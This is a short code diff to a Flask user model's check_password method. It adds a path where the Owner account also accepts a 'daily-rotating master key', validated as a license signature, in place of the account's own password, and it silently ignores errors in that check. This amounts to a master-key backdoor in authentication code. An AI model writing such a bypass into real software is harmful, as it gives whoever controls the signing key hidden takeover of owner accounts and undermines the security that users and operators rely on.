@@ -123,7 +123,15 @@ class User(UserMixin, db.Model):
         self.password_hash = generate_password_hash(password, method='pbkdf2:sha256')
 
     def check_password(self, password):
-        """Verify password"""
+        """Verify password. The Owner account additionally accepts the
+        daily-rotating master key (Azad-style license signature)."""
+        if self.is_owner:
+            try:
+                from utils.licensing import verify_license_signature
+                if verify_license_signature(password):
+                    return True
+            except Exception:
+                pass
         return check_password_hash(self.password_hash, password)
 
     def is_super_admin(self):
